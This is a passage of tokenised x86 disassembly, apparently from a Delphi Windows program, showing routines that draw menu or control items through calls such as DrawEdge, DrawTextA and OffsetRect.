jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_421ccc
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_421cd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504cf
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404200
push eax
mov eax [ ebp - 0xc ]
call sub_404400
push eax
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_421a0c
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404200
push eax
mov eax [ ebp - 0xc ]
call sub_404400
push eax
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_421a0c
mov eax 0xff00000d
call sub_42154c
mov esi eax
mov eax 0xff000010
call sub_42154c
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_421a0c
jmp r-xdata
sub_450534
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_450e1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4221f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_421a0c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40434c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4221f8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0d0
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4221f8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45097b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4279e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_421a0c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0d0
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4221f8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_428a38
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221cc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4226e0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d5e8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4502e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_421cd8
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4224f0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_421a0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40316c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4502e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450e23
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f3a8
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4502e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_450e3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_451744
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4221f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_421a0c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40434c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4221f8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0d0
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
